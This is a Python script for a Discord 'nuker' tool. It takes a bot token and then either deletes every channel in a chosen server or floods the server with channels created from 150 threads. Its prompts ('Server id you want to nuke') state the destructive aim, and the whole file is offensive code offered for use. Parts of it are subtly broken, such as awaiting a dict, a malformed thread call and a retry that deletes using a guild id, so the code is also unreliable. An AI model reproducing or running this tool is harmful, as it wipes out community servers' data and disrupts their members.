import asyncio,aiohttp;from pystyle import Center,Colors,Colorate,Write;import random;import os,threading



class Checker:
    def __init__(self):
        self.apiversions = [i for i in range(6,11)]
        self.logo = """
        
██   ██     ███    ██ ██    ██ ██   ██ ███████ ██████  
 ██ ██      ████   ██ ██    ██ ██  ██  ██      ██   ██ 
  ███       ██ ██  ██ ██    ██ █████   █████   ██████  
 ██ ██      ██  ██ ██ ██    ██ ██  ██  ██      ██   ██ 
██   ██     ██   ████  ██████  ██   ██ ███████ ██   ██ 
                                                       
                                                       
"""
        self.token = None
        self.username = None
        self.guildid = None
        self.disc = None
        self.menuprint = """
[1] - Delete all channels
[2] - Create channels
        """


    async def delchannel(self,channelid):
        #print(f"https://discord.com/api/v{random.choice(self.apiversions)}/{channelid}")
        async with aiohttp.ClientSession(headers={"authorization":"Bot %s" % (self.token)}) as client:
            async with client.delete(f"https://discord.com/api/v{random.choice(self.apiversions)}/channels/{channelid}") as response:
                if response.status == 200:
                    Write.Print(Center.XCenter("[+] Deleted %s" % (channelid)), Colors.dark_green, interval=0)
                    return True
                else:
                    if 'retry_after' in response.text:
                        Write.Print(Center.XCenter("[!] Ratelimited for %s" % (await response.json()['retry_after'])), Colors.orange, interval=0)
                        await asyncio.sleep(await response.json()['retry_after'])
                        await self.delchannel(channelid)
                    else:
                        Write.Print(Center.XCenter("[!] Error %s" % (await response.json()), Colors.red, interval=0))


    
    async def createchann(self,guildid):
        #print(f"https://discord.com/api/v{random.choice(self.apiversions)}/{channelid}")
        async with aiohttp.ClientSession(headers={"authorization":"Bot %s" % (self.token)}) as client:
            async with client.post(f"https://discord.com/api/v{random.choice(self.apiversions)}/guilds/{guildid}/channels", json={"type":0,"name":"d","permission_overwrites":[]}) as response:
                json = await response.json()
                if str(response.status).startswith("2"):
                    Write.Print(Center.XCenter("[+] Created %s" % (json['id'])), Colors.dark_green, interval=0)
                    return True
                else:
                    if 'retry_after' in await json:
                        Write.Print(Center.XCenter("[!] Ratelimited for %s" % (json['retry_after'])), Colors.orange, interval=0)
                        await asyncio.sleep(json['retry_after'])
                        await self.delchannel(guildid)
                    else:
                        Write.Print(Center.XCenter("[!] Error %s" % (json)), Colors.red, interval=0)

    
    
    async def menu(self):
        os.system("CLS")
        Write.Print(Center.XCenter(self.logo), Colors.red_to_white,interval=0)
        Write.Print(Center.XCenter("\n%s#%s" % (self.username,self.disc)),Colors.red_to_white,interval=0)
        Write.Print(Center.XCenter(self.menuprint),Colors.red_to_white,interval=0)
        choice = Write.Input(Center.XCenter("\n[?] Choice >>> "), Colors.red_to_white,interval=0.00001)
        try: choice = int(choice)
        except ValueError: 
            Write.Print(Center.XCenter("\n[!] Invalid choice"), Colors.red_to_white,interval=0)
            await asyncio.sleep(5.5)
            await self.menu()        
        finally: pass
        match choice:
            case 1:
                guildid = Write.Input(Center.XCenter("\n[?] Server id you want to nuke >>> "), Colors.red_to_white,interval=0.00001)
                if len(str(guildid)) < 19:
                    Write.Print(Center.XCenter("\n[!] Invalid server id"), Colors.red_to_white,interval=0)
                    await asyncio.sleep(5.5)
                    await self.menu()   
                else:pass
                async with aiohttp.ClientSession(headers={"Authorization":"Bot %s" % (self.token)}) as client:
                    async with client.get("https://discord.com/api/v%s/guilds/%s" % (random.choice(self.apiversions), guildid)) as response:
                        if response.status == 200:
                            pass
                        else:
                            Write.Print(Center.XCenter("\n[!] Invalid guild"), Colors.red_to_white,interval=0)
                            await asyncio.sleep(5.5)
                            await self.menu() 
                        response.close()
                        async with client.get("https://discord.com/api/v%s/guilds/%s/channels" % (random.choice(self.apiversions), guildid)) as response:
                            print(await response.json())
                            for channel in await response.json():
                                await asyncio.gather(asyncio.create_task(self.delchannel(channel['id'])))
            case 2:
                guildid = Write.Input(Center.XCenter("\n[?] Server id you want to nuke >>> "), Colors.red_to_white,interval=0.00001)
                if len(str(guildid)) < 19:
                    Write.Print(Center.XCenter("\n[!] Invalid server id"), Colors.red_to_white,interval=0)
                    await asyncio.sleep(5.5)
                    await self.menu()   
                else:pass
                async with aiohttp.ClientSession(headers={"Authorization":"Bot %s" % (self.token)}) as client:
                    async with client.get("https://discord.com/api/v%s/guilds/%s" % (random.choice(self.apiversions), guildid)) as response:
                        if response.status == 200:
                            pass
                        else:
                            Write.Print(Center.XCenter("\n[!] Invalid guild"), Colors.red_to_white,interval=0)
                            await asyncio.sleep(5.5)
                            await self.menu() 
                        response.close()
                        for thrd in range(150):
                            threading.Thread(target=asyncio.gather, args=(self.createchann(guildid))).start()
    async def main(self):
        os.system("cls")
        Write.Print(Center.XCenter(self.logo), Colors.red_to_white,interval=0)
        self.token = Write.Input(Center.XCenter("\nBot Token >>> "), Colors.red_to_white,interval=0.00001)
        async with aiohttp.ClientSession(headers={"Authorization":"Bot %s" % (self.token)}) as client:
            async with client.get("https://discord.com/api/v%s/users/@me" % (random.choice(self.apiversions))) as response:
                if int(response.status) == 200:
                    r = await response.json()
                    self.username = r['username']
                    self.disc = r['discriminator']
                    Write.Print(Center.XCenter("\nLogged as %s#%s" % (self.username,self.disc)),Colors.red_to_white,interval=0)
                    await self.menu()
                else:
                    Write.Print(Center.XCenter("\n[!] ERROR - %s" % (await response.json())), Colors.red_to_white,interval=0.00001)
                    await asyncio.sleep(5.5)
                    await self.main()
if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(Checker().main())